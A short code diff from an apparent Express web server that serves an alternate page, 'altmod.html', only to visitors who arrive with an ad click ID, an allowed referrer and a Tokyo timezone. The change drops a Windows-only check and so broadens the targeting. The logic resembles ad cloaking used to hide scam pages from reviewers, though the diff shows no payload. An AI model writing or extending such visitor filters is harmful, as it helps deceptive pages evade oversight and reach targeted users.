@@ -76,7 +76,6 @@ app.post(
 
     // Check all conditions and log them
     if (hasGclidParam(req) &&
-        isWindowsOS(userAgent) &&
         isAllowedReferrer(referer) &&
         isTokyoTimezone) {
       res.sendFile(path.join(__dirname, "altmod.html"));
